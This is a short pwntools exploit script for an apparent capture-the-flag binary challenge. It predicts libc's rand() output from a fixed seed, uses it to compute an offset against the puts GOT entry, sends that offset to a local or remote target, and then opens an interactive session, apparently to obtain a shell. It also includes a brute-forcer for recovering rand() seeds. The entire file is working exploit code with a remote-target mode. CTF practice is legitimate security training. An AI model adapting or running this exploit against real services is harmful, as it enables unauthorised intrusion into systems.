from pwn import *
import sys
from ctypes import CDLL

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./chall_patched"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b *main+208
'''

libcx = CDLL("libc.so.6")
# now = int(floor(time.time()))
# libcx.srand(now)
# print(libcx.rand())

def get_random(number, max_iters=10000000):
    log.info(f"searching for {number} [{hex(number)}]")
    libcx = CDLL("libc.so.6")
    for i in range(max_iters):
        libcx.srand(i)
        if libcx.rand() == number :
            log.success(f"found_seed {i}")
            sys.exit()

def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def exploit():
    #offset = 
    log.info("binary loaded")
    pp.recvuntil(b"!\n")
    libcx.srand(69)
    offset = (libcx.rand() - elf.got.puts) * -1
    print(offset)
    pp.sendline(b"69")
    pp.sendline(str(offset).encode())
    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
